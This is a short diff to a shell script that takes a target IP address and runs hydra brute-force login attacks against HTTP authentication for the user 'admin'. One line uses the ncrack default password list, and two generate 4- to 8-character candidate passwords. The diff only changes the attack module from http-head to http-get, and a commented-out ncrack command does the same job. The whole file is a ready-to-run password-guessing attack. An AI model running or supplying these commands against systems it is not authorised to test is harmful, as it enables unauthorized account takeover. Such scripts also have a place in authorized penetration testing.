@@ -5,6 +5,6 @@ IP=$1
 PWDFILE=/usr/share/ncrack/default.pwd
 
 #ncrack -vvvv --user admin -P ${PWDFILE} -T5 http://${IP}
-hydra -m / -l admin -P ${PWDFILE} -e nsr -f -v ${IP} http-head
-hydra -m / -l admin -x 4:4:aA1 -e nsr -f -v ${IP} http-head
-hydra -m / -l admin -x 4:8:aA1._%/ -e nsr -f -v ${IP} http-head
+hydra -m / -l admin -P ${PWDFILE} -e nsr -f -v ${IP} http-get
+hydra -m / -l admin -x 4:4:aA1 -e nsr -f -v ${IP} http-get
+hydra -m / -l admin -x 4:8:aA1._%/ -e nsr -f -v ${IP} http-get
